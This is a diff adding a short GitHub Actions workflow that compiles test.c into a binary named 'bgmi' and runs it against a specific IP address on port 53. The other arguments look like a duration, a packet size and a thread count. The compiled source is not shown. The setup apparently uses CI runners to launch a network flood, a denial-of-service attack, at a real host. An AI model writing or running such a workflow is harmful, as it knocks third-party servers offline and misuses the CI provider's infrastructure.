@@ -1,0 +1,21 @@
+name: Compile and Run C Program
+
+on:
+  workflow_dispatch:  # manual trigger
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout repo
+      uses: actions/checkout@v4
+
+    - name: Install dependencies
+      run: sudo apt update && sudo apt install -y gcc zlib1g-dev
+
+    - name: Compile
+      run: gcc -o bgmi test.c -lpthread -lz -static
+
+    - name: Run program
+      run: ./bgmi 50.7.23.148 53 30 1024 10
